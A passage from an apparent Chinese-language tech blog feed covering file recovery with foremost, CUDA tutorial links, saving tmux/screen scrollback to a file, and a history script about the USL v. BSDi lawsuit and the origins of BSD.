在 &lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;DataRecovery - Community Help Wiki&lt;/a&gt; 裡頭寫著支援 fat, ext3 和 NTFS&lt;br /&gt;
所以才想裝來試試看  &lt;/p&gt;
&lt;p&gt;Arch Linux Official Package 裡頭有&lt;br /&gt;
所以直接 &lt;code&gt;sudo pacman -S foremost&lt;/code&gt; 就能安裝了&lt;br /&gt;
使用方法也沒有很難  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus.  
$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &amp;lt;type&amp;gt;] [-s &amp;lt;blocks&amp;gt;] [-k &amp;lt;size&amp;gt;]  
    [-b &amp;lt;size&amp;gt;] [-c &amp;lt;file&amp;gt;] [-o &amp;lt;dir&amp;gt;] [-i &amp;lt;file]  

-V  - display copyright information and exit  
-t  - specify file type.  (-t jpeg,pdf ...)  
-d  - turn on indirect block detection (for UNIX file-systems)  
-i  - specify input file (default is stdin)  
-a  - Write all headers, perform no error detection (corrupted files)  
-w  - Only write the audit file, do not write any detected files to the disk  
-o  - set output directory (defaults to output)  
-c  - set configuration file to use (defaults to foremost.conf)  
-q  - enables quick mode. Search are performed on 512 byte boundaries.  
-Q  - enables quiet mode. Suppress output messages.  
-v  - verbose mode. Logs all messages to screen  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用前先把外接硬碟 &lt;code&gt;umount&lt;/code&gt; 後&lt;br /&gt;
再 &lt;code&gt;foremost -t jpg -i /dev/sdb1 -o /recovery&lt;/code&gt;&lt;br /&gt;
這是我這次的使用情況: 把 sdb1 中的 .jpg 檔案還原到 /recovery 這個資料夾中&lt;br /&gt;
比較詳細一點的範例可以參考 &lt;a href="https://help.ubuntu.com/community/DataRecovery#Foremost"&gt;https://help.ubuntu.com/community/DataRecovery#Foremost&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;另外在 &lt;a href="https://wiki.archlinux.org/index.php/File_recovery#Foremost"&gt;https://wiki.archlinux.org/index.php/File_recovery#Foremost&lt;/a&gt; 也有寫到&lt;br /&gt;
&lt;code&gt;foremost&lt;/code&gt; 會根據檔案的 headers, footers 以及內部的資料結構來進行檔案的回復&lt;br /&gt;
可以裝在 Live USB 上使用當作救援USB，也可以直接安裝來使用&lt;br /&gt;
並且可以透過 config file (&lt;code&gt;/etc/foremost.conf&lt;/code&gt;)來決定要回復哪些類型的檔案&lt;br /&gt;
內建也有提供檔案類型可供選擇：&lt;br /&gt;
jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果沒有用 -t 指定檔案類型的話，預設就是回復所有檔案  &lt;/li&gt;
&lt;li&gt;-i 則是接要救援的東西(預設是 stdin，可以是單檔、磁區或是映像檔)  &lt;/li&gt;
&lt;li&gt;-o 就接要把復原的檔案放到哪裡  &lt;/li&gt;
&lt;li&gt;-v 的話可以把 log print 到 stdout  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;總之用法大概就是這樣&lt;br /&gt;
對了 要注意一下 -o 參數接的目標位置的容量夠不夠大，不夠大的話可能會悲劇(?)  &lt;/p&gt;
&lt;h3&gt;結果&lt;/h3&gt;
&lt;p&gt;程式大概執行了兩個半小時左右&lt;br /&gt;
總共回復了 24,481 個 jpg 檔&lt;br /&gt;
大小約 11G 左右&lt;br /&gt;
只有稍微看一下，但的確都是消失的檔案沒錯&lt;br /&gt;
之後應該就是慢慢將檔案重新分類就是  &lt;/p&gt;
&lt;h3&gt;結論&lt;/h3&gt;
&lt;p&gt;第一次自己搞檔案救援，還好沒把外接硬碟弄掛，不然我一定會哭死&lt;br /&gt;
畢竟這台外接硬碟也有點年紀了，大概也用了6年左右，很怕他哪天突然壞軌掛掉&lt;br /&gt;
然後 &lt;code&gt;extundelete&lt;/code&gt; 我還沒試過，只是剛好看到順便提一下&lt;br /&gt;
至於 &lt;code&gt;foremost&lt;/code&gt;，在 &lt;a href="https://github.com/korczis/foremost"&gt;https://github.com/korczis/foremost&lt;/a&gt; 有原始碼，&lt;br /&gt;
稍微瞄過了一下，覺得程式碼寫的蠻乾淨的，有空的時候想去理解一下裏面程式碼怎麼寫的&lt;br /&gt;
然後 README 裏面寫到  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Foremost was written by Special Agent Kris Kendall and Special Agent Jesse  
Kornblum of the United States Air Force Office of Special Investigations  
starting in March 2001.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;恩 沒錯 是美國空軍特別調查辦公室(AFOSI)的兩位特務(Special Agent)寫的&lt;br /&gt;
不愧是美國政府出品 真的蠻猛的 而且還是距今十幾年的 project&lt;br /&gt;
(真不知道我自己現在寫的這些程式 十多年後還能不能正常運作)&lt;br /&gt;
老實說我本來真的對回復這些檔案不抱任何期待&lt;br /&gt;
畢竟有點 UNIX-like system 使用經驗的人大概都知道 rm 跟 mv 不要亂下&lt;br /&gt;
下了就別抱太大的期待能救回來了，畢竟這不是丟到垃圾桶而已&lt;br /&gt;
但 foremost 真的幫我把圖片救回來了...&lt;br /&gt;
所以寫個文章紀錄一下這個好東西&lt;br /&gt;
(只是不知道 24,881 個圖片我要手動分類多久Orz)  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/korczis/foremost"&gt;https://github.com/korczis/foremost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;https://help.ubuntu.com/community/DataRecovery&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/File_recovery"&gt;https://wiki.archlinux.org/index.php/File_recovery&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Foremost"&gt;https://wiki.archlinux.org/index.php/Foremost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://foremost.sourceforge.net/"&gt;http://foremost.sourceforge.net/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Data Recovery"></category><category term="foremost"></category><category term="Life"></category></entry><entry><title>Nice Series of CUDA Tutorials on ptt.cc</title><link href="https://blog.m157q.tw/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/" rel="alternate"></link><published>2015-10-26T14:04:00+08:00</published><updated>2015-10-26T14:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-15:posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1222302747.A.CC4.html"&gt;[分享] CUDA 程式設計(1) -- 簡介 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1222881899.A.C62.html"&gt;[分享] CUDA 程式設計(2) -- SIMT概觀 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1223477316.A.1F8.html"&gt;[分享] CUDA 程式設計(3) -- CUDA 安裝 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1223477872.A.1C2.html"&gt;[分享] CUDA 程式設計(4) -- 硬體規格簡介 &amp;amp; 採購參考 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1224074823.A.786.html"&gt;[分享] CUDA 程式設計(5) -- 第一支程式 (向量加法) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1224674233.A.4CC.html"&gt;[分享] CUDA 程式設計(6) -- 記憶體 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225285229.A.F15.html"&gt;[分享] CUDA 程式設計(7) -- 來玩泡泡吧 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225888236.A.79A.html"&gt;[分享] CUDA 程式設計(8) -- OpenMP vs. SIMT - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225912100.A.5B0.html"&gt;[分享] CUDA 程式設計(9) -- 泡泡龍 part 2 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1226501606.A.7E2.html"&gt;[分享] CUDA 程式設計(10) -- 速成篇(上) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1227118854.A.0F1.html"&gt;[分享] CUDA 程式設計(11) -- 速成篇(中) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1227708086.A.351.html"&gt;[分享] CUDA 程式設計(12) -- 速成篇(下) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1228930736.A.779.html"&gt;[分享] CUDA 程式設計(13) -- 材質快取 (一) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1231036765.A.649.html"&gt;[分享] CUDA 程式設計(14) -- 新年來開始 warp 吧 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1233304220.A.98D.html"&gt;[分享] CUDA 程式設計(15) -- 翻譯 RWT P4 [CUDA API] - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CUDA"></category><category term="GPU"></category><category term="Tutorial"></category></entry><entry><title>Save Content of tmux/screen Scrollback Into A File</title><link href="https://blog.m157q.tw/posts/2015/07/27/save-content-of-tmux-or-screen-scrollback-into-a-file/" rel="alternate"></link><published>2016-09-12T00:24:00+08:00</published><updated>2016-09-12T00:24:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-07-27:posts/2015/07/27/save-content-of-tmux-or-screen-scrollback-into-a-file/</id><summary type="html">&lt;p&gt;因為某些原因，&lt;br /&gt;
想要把 tmux copy mode 裡面的內容 dump 出來。&lt;br /&gt;
但因為之前沒試過，不知道該如何做，所以去查了一下，&lt;br /&gt;
以下整理簡單步驟：  &lt;/p&gt;
&lt;h2&gt;tmux&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;將指定的行數 (&lt;code&gt;$linenum&lt;/code&gt;) 存到 buffer 中，進入 copy mode 後，即可在右上角看到行數。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:capture-pane -S -$linenum  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;將剛剛存到 buffer 中的內容，儲存到指定的檔案路徑 (&lt;code&gt;$filepath&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:save-buffer $filepath  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;刪除 buffer 中的內容 (optional)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:delete-buffer  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$filepath&lt;/code&gt; 檔案中應該就是 dump 出來的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;screen&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;screen&lt;/code&gt; 的話，目前看到的相似用法是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:hardcopy -h $filepath  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但這個用法只能儲存全部的內容，無法選擇行數。  &lt;/p&gt;
&lt;p&gt;然後我在 screen 版本 4.04.00 (GNU) 19-Jun-16 使用時，&lt;br /&gt;
如果內容裏面有中文的話，&lt;br /&gt;
dump 出來以後中文會變成亂碼。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/26548/write-all-tmux-scrollback-to-a-file"&gt;Write all tmux scrollback to a file - Unix &amp;amp; Linux Stack Exchange&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/4807474/copying-gnu-screen-scrollback-buffer-to-file-extended-hardcopy"&gt;Copying GNU screen scrollback buffer to file (extended hardcopy)? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="tmux"></category><category term="screen"></category></entry><entry><title>4BSD 與 AT&amp;T 官司訴訟的影響</title><link href="https://blog.m157q.tw/posts/2015/06/16/4bsd-and-att-lawsuit/" rel="alternate"></link><published>2017-10-02T14:41:00+08:00</published><updated>2017-10-02T14:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-16:posts/2015/06/16/4bsd-and-att-lawsuit/</id><summary type="html">&lt;p&gt;原連結：&lt;a href="https://fossapc.hackpad.com/B0-1oYaaSKkruW"&gt;https://fossapc.hackpad.com/B0-1oYaaSKkruW&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;影片連結：&lt;a href="https://www.youtube.com/watch?v=LLtj41eyvcA"&gt;https://www.youtube.com/watch?v=LLtj41eyvcA&lt;/a&gt;&lt;br /&gt;
影片下載：&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIaDJXOW9NUnBCYU0/view?usp=sharing"&gt;https://drive.google.com/file/d/0B9cCeTKOkfWIaDJXOW9NUnBCYU0/view?usp=sharing&lt;/a&gt;&lt;br /&gt;
字幕檔下載：&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIeXNHUm9hZGFfckU/view?usp=sharing"&gt;https://drive.google.com/file/d/0B9cCeTKOkfWIeXNHUm9hZGFfckU/view?usp=sharing&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;授權聲明&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;《USL v. BSDi 官司》之影片與字幕檔由 Pellaeon Lin, Chiu Hsiang Hsu, Shun-Yi Jheng 共同製作，&lt;br /&gt;
以創用CC 姓名標示-非商業性-相同方式分享 3.0 台灣 授權條款&lt;br /&gt;
(&lt;a href="http://creativecommons.org/licenses/by-nc-sa/3.0/tw/"&gt;http://creativecommons.org/licenses/by-nc-sa/3.0/tw/&lt;/a&gt;) 釋出。&lt;br /&gt;
此作品衍生自 &lt;a href="https://www.youtube.com"&gt;https://www.youtube.com&lt;/a&gt; 。  &lt;/p&gt;
&lt;h1&gt;影片劇本&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=aurDHyL7bTA"&gt;https://www.youtube.com/watch?v=aurDHyL7bTA&lt;/a&gt;&lt;br /&gt;
不知道能不能做一個類似的短片來介紹...(?  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;背景、角色介紹&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UNIX  &lt;/li&gt;
&lt;li&gt;Berkeley  &lt;/li&gt;
&lt;li&gt;AT&amp;amp;T  &lt;/li&gt;
&lt;li&gt;Introduction  &lt;/li&gt;
&lt;li&gt;subsidiary company  &lt;/li&gt;
&lt;li&gt;USL  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;過程&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整場訴訟的前情提要  &lt;/li&gt;
&lt;li&gt;為什麼要打官司  &lt;/li&gt;
&lt;li&gt;官司內容  &lt;/li&gt;
&lt;li&gt;最後結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;影響&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;對照 Linux 的崛起  &lt;/li&gt;
&lt;li&gt;Net/1, Net/2, 386BSD  &lt;/li&gt;
&lt;li&gt;BSD 的後續發展  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;逐字稿&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;【開場】&lt;br /&gt;
今天我們要來介紹 UNIX 家族中很有名的作業系統——BSD 歷史上知名的一場法律戰役，Unix System Laboratories 對上柏克萊大學。  &lt;/p&gt;
&lt;p&gt;【介紹】&lt;br /&gt;
首先來介紹一下 UNIX ，UNIX 是 AT&amp;amp;T Bell labs 於 1969 年開發的作業系統，&lt;br /&gt;
當時的電腦還很昂貴，最知名的系統是 DEC 公司的 PDP 系列，其中最流行的是 PDP-11 ，&lt;br /&gt;
他長這個樣子（show 圖片）。  &lt;/p&gt;
&lt;p&gt;60 年代晚期，美國 AT&amp;amp;T 公司底下的 Bell Labs 與 MIT 和 General Electric 公司，也就是奇異公司，合作開發一套名為 Multics 的作業系統，這套系統源自阿波羅登月計劃所使用的 CTSS 作業系統，&lt;br /&gt;
CTSS 在當時是個很先進的作業系統，全名為 Compatible Time-Sharing System，設計的目標是分時多工，也就是同一時間內，可以讓多個使用者同時執行多個程式，對之後電腦的設計造成重大的影響。  &lt;/p&gt;
&lt;p&gt;但是呢，AT&amp;amp;T Bell Labs 在 1969 年的時候，因為覺得 Multics 的開發進度實在是太慢了，所以退出了這個計畫。有兩位 Bell Labs 的工程師很不開心——Ken Thompson 和 Dennis Ritchie （畫），Ken Thompson 在 Multics 上面開發了一個太空遊戲 Space Travel ，雖然他再也不用繼續開發 Multics 了，但是這樣就沒有遊戲機可以玩了。Thompson 覺得不開心。「不過沒關係」，Ken Thompson 說，「反正 Space Travel 這遊戲在 Multics 這爛作業系統上面也跑的很慢」，「不如我們來開發一個新的作業系統吧！」。超熱血的 Ken Thompson 在辦公室裡面找到一台閒置的 PDP-7 舊電腦，找了一群人開始開發 UNIX 。  &lt;/p&gt;
&lt;p&gt;UNIX 一開始使用組合語言開發，運行於 PDP-7 上面，後來主管覺得 UNIX 真不錯，於是提供更多資源給團隊繼續開發，漸漸地， 公司其他部門也發現 UNIX 比起當時 PDP 系列預載的作業系統好用多了，對於 UNIX 的需求逐漸增加，這也使得 UNIX 有了跨平臺的需求。為了滿足跨平臺的需求，團隊發明了一種新的程式語言——C，並且逐漸將 UNIX 的各個部分使用 C 重寫。  &lt;/p&gt;
&lt;p&gt;後來團隊持續開發，這一系列的 UNIX 稱作 Research UNIX ，也就是早期研究中的 UNIX 。1973 年 11 月，釋出 Research UNIX 第四版，是第一個完整使用 C 語言實作的版本，1974 年 6 月，釋出第五版，這個版本被廣泛授權給教育機構使用——包含柏克萊大學。  &lt;/p&gt;
&lt;p&gt;背景就先講到這邊，接下來我們移動鏡頭，介紹一下 Berkeley 和 CSRG.  &lt;/p&gt;
&lt;p&gt;柏克萊大學 1973 年取得 AT&amp;amp;T 的 UNIX 授權之後，1974年成立了一個研究小組——Computer Systems Research Group ，來修改並改進 UNIX ，在 AT&amp;amp;T 與 Berkeley 的授權協議當中，AT&amp;amp;T 允許 Berkeley 修改原始碼，並且將修改後的原始碼發佈給其他 AT&amp;amp;T UNIX 的使用者，這一系列的發佈就稱作 BSD, Berkeley Software Distribution 。BSD 持續地演進，釋出了 1BSD、2BSD、3BSD、4BSD、4.1BSD 和 4.2 BSD，這些版本都包含 AT&amp;amp;T 原始碼，因此只能提供給 AT&amp;amp;T UNIX 的其他使用者。  &lt;/p&gt;
&lt;p&gt;1980 年的時候，CSRG 接了一個 DARPA 的計劃，DARPA 就是大名鼎鼎的美國國防部高等計劃研究署，當時 DARPA 正在發展 Internet 的前身 ARPANET，DARPA 希望 CSRG 在 UNIX 上面開發 ARPANET 所需的網路功能，包含 TCP/IP 協定，這些功能後來都釋出在 4.3BSD。  &lt;/p&gt;
&lt;p&gt;4.3BSD 當中的 TCP/IP 是當時最完整的實作，因此很多人都想要，在大家的要求下，柏克萊將 4.3BSD 當中 AT&amp;amp;T 的原始碼移除，將它釋出為 4.3BSD Networking Release 1 ，也就是俗稱的 Net/1 ，這是第一個可以公開流通的 BSD 版本。後來，BSD 團隊中的一位開發者提議，將 Net/1 當中 AT&amp;amp;T 的程式用自己的原始碼重新實作，如此一來公開流通的 BSD 就會更加地完整，經過了18個月的開發，BSD 團隊 1991 年6月釋出了 Networking Release 2 , Net/2 。Net2比起 Net/1 新增了很多功能，原本這些功能是 AT&amp;amp;T 所開發因此無法公開，在 Net/2 當中這些部分都由 CSRG 重新實作了。雖然如此， Net/2 仍然不是完整的作業系統，釋出之前 Net/2 的核心裡面仍然包含少數 AT&amp;amp;T 原始檔，團隊決定將這些檔案移除後釋出 Net/2 。Net/2 是 BSD 歷史上很重要的版本，因為後來許多衍生的 BSD 都是基於 Net/2 來開發的，像是 William 和 Lynne Jolitz 夫婦所開發的 386BSD ，即是將 Net/2 當中缺少的部分重新實作，並移植到 Intel 80386 處理器上面再公開釋出的版本。  &lt;/p&gt;
&lt;p&gt;1991 年 Net/2 釋出後，CSRG的核心成員出來開了一家公司——BSDI，Berkeley Software Design, Inc ，將 BSD 打包整合成為一個完整的作業系統，稱做 BSD/OS ，BSDI 販售 BSD/OS 的使用授權和支援服務。  &lt;/p&gt;
&lt;p&gt;這時候 AT&amp;amp;T 不高興了，因為 CSRG 拿 UNIX 的原始碼來修改成 4.3BSD Net/2 ，BSDI 又再拿 Net/2 包裝成 BSD/OS ，再拿去賣。當時的 BSD/OS 授權及原始碼，只要 995 美金，但是功能幾乎完全一樣的 AT&amp;amp;T UNIX/32V 要價超過 20000 美元，AT&amp;amp;T 的顧客都被搶走了。&lt;br /&gt;
雖然 Berkeley 認為他們已經將 AT&amp;amp;T 的原始碼都移除了，但是 AT&amp;amp;T 認為還是有侵權 ，於是1992年的時候透過他們的子公司 UNIX System Laboratories ，USL 對 BSDI 公司提出了告訴。  &lt;/p&gt;
&lt;p&gt;原告 USL 認為柏克萊大學釋出的 Net/2 當中部分檔案是 USL 的智慧財產，但是柏克萊認為他們已經移除所有 USL 的檔案。而雙方的爭議就在於，當時 AT&amp;amp;T 為了要推廣 UNIX ，默許部分的 UNIX 原始碼公開在教科書內，因此柏克萊認為這可以視為 AT&amp;amp;T 允許這些原始碼的公開流通，而 AT&amp;amp;T 不這麼認為。&lt;br /&gt;
並且，柏克萊認為他們釋出的部分原始碼屬於合理使用範圍，這些原始碼是 POSIX 規範的實作，幾乎只能有一種實作方法，因此他們使用這部分的原始碼不算侵權。這邊補充解釋一下 POSIX ，POSIX 是一套作業系統 API 的規範，宗旨在於希望各種不同的作業系統間至少能夠維持基本的相容性。&lt;br /&gt;
最後，柏克萊還說，USL 所聲稱的這些屬於他們的檔案，僅佔 Net/2 的極小部分，因此 Net/2 不能算是 UNIX/32V 的衍生作品。  &lt;/p&gt;
&lt;p&gt;訴訟進行了一年，後來 1993 年雙方在法庭外和解。和解的雙方同意不再針對此一案件進行後續法律行動。和解的條件有好幾項，但是最重要的是，柏克萊會將極少數的侵權檔案移除或修改，在 BSD 一萬八千個檔案中，柏克萊只需刪除其中3個，並且將其中70個加上 USL 的版權宣告，整個和解的結果大致是對 BSD 有利的。  &lt;/p&gt;
&lt;p&gt;訴訟之後，柏克萊1994 年釋出了下一版本的 BSD —— 4.4BSD ，4.4 BSD 又再分為兩個版本，4.4BSD-Lite 以及 4.4BSD-Encumbered ，其中 4.4BSD-Lite 是不包含任何 AT&amp;amp;T 原始碼的版本，允許公開流通；而 4.4BSD-Encumbered 則包含了 AT&amp;amp;T 原始碼，僅提供給 AT&amp;amp;T UNIX 合法授權的使用者使用。  &lt;/p&gt;
&lt;p&gt;1995 年的時候，柏克萊釋出了最後一版的 BSD—— 4.4BSD-Lite Release 2 ，釋出之後 CSRG 就解散了，柏克萊大學不再繼續開發BSD 。不過，解散的這群人，他們又各自發起了新的開發計劃，大部分都是基於 4.4BSD-Lite ，以及 Jolitz 夫婦所開發的 386BSD 。這些新計劃大多都延續到今日，有 FreeBSD 和 NetBSD ，後來 FreeBSD 又分支出 DragonflyBSD ，NetBSD 又分支出 OpenBSD 。  &lt;/p&gt;
&lt;p&gt;今天，FreeBSD 是 BSD 家族中最受歡迎的版本，而其他的 BSD 也都有在持續的開發並釋出新版本。  &lt;/p&gt;
&lt;p&gt;BSD 家族的故事就講到這邊了。  &lt;/p&gt;
&lt;h1&gt;過程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;USL 1992 年提起訴訟，1994年和解，和解條件2004年公開  &lt;/li&gt;
&lt;li&gt;USL 原訴：  &lt;/li&gt;
&lt;li&gt;Berkeley 釋出的 NET-2 違反了 USL 和 Berkeley 的軟體授權協議以及 USL 對 UNIX 的著作權  &lt;/li&gt;
&lt;li&gt;等等，都是關於 NET-2  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://goo.gl/kA97T6"&gt;UNIX System Laboratories, Inc. v. Berkeley Software Design, Inc.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;em&gt;USL v. BSDi&lt;/em&gt;&lt;/strong&gt; was a &lt;a href="https://en.wikipedia.org/wiki/Lawsuit"&gt;lawsuit&lt;/a&gt; brought in the United States in 1992 by &lt;a href="https://en.wikipedia.org/wiki/Unix_System_Laboratories"&gt;Unix System Laboratories&lt;/a&gt; against &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Design"&gt;Berkeley Software Design&lt;/a&gt;, Inc and the &lt;a href="https://en.wikipedia.org/wiki/Regents_of_the_University_of_California"&gt;Regents of the University of California&lt;/a&gt; over &lt;a href="https://en.wikipedia.org/wiki/Intellectual_property"&gt;intellectual property&lt;/a&gt; related to &lt;a href="https://en.wikipedia.org/wiki/Unix"&gt;UNIX&lt;/a&gt;.  The case was settled out of court in 1993 after the judge expressed  doubt in the validity of USL's intellectual property, with Novell (who  by that time had bought USL) and BSDi agreeing not to litigate further  over the &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;Berkeley Software Distribution&lt;/a&gt; (BSD), which would later develop into a &lt;a href="https://en.wikipedia.org/wiki/Comparison_of_BSD_operating_systems"&gt;range of BSD&lt;/a&gt; distributions, each tuned to its own specific audience's strengths and markets.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;Berkeley Software Distribution&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Historically, BSD has been considered a branch of Unix, &lt;strong&gt;Berkeley Unix&lt;/strong&gt;, because it shared the initial codebase and design with the original &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt; Unix operating system.  &lt;/li&gt;
&lt;li&gt;4.1BSD (June 1981) was a response to criticisms of BSD's performance relative to the dominant VAX operating system, &lt;a href="https://en.wikipedia.org/wiki/OpenVMS"&gt;VMS&lt;/a&gt;. The 4.1BSD kernel was systematically tuned up by &lt;a href="https://en.wikipedia.org/wiki/Bill_Joy"&gt;Bill Joy&lt;/a&gt; until it could perform as well as VMS on several benchmarks. The release would have been called &lt;em&gt;5BSD&lt;/em&gt;, but after objections from &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt; the name was changed; AT&amp;amp;T feared confusion with &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt;'s &lt;a href="https://en.wikipedia.org/wiki/UNIX_System_V"&gt;UNIX System V&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Net/1  &lt;ul&gt;
&lt;li&gt;Until then, all versions of BSD incorporated proprietary AT&amp;amp;T Unix  code and were, therefore, subject to an AT&amp;amp;T software license.  Source code licenses had become very expensive and several outside  parties had expressed interest in a separate release of the networking  code, which had been developed entirely outside AT&amp;amp;T and would not  be subject to the licensing requirement. This led to &lt;strong&gt;Networking Release 1&lt;/strong&gt; (&lt;strong&gt;Net/1&lt;/strong&gt;), which was made available to non-licensees of AT&amp;amp;T code and was &lt;a href="https://en.wikipedia.org/wiki/Free_software"&gt;freely redistributable&lt;/a&gt; under the terms of the &lt;a href="https://en.wikipedia.org/wiki/BSD_license"&gt;BSD license&lt;/a&gt;. It was released in June 1989.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Net/2  &lt;ul&gt;
